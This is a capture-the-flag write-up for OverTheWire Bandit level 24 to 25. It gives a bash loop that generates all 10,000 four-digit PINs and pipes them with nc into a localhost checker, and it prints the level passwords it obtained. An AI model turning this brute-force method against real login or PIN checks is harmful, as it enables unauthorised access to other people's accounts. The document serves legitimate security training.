# Bandit Level 24 to 25

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Bandit |
| Level | 24 -> 25 |
| Status | Complete |

## Objective

Brute-force the four-digit PIN required by the localhost password checker for `bandit25`.

## Given Access

User: `bandit24`

Password:

```text
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

## Recon

The service on localhost port `30002` expects the current `bandit24` password and a secret four-digit PIN on one line, separated by a space.

## Method

Generate every PIN from `0000` through `9999`, prepend the current password to each attempt, and pipe the batch into the service with `nc`.

## Commands

```bash
workdir=$(mktemp -d /tmp/bandit24_to_25.XXXXXX)

for pin in $(seq -w 0000 9999); do
  printf '%s %s\n' 'gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8' "$pin"
done > "$workdir/attempts"

nc localhost 30002 < "$workdir/attempts" | grep -v '^Wrong!'
```

## Result

The service returned:

```text
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

Password for `bandit25`:

```text
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

## Lesson

Small keyspaces are best handled with generated input instead of manual trial. `seq -w` preserves leading zeroes, which is necessary for four-digit PINs.

## References

- https://overthewire.org/wargames/bandit/
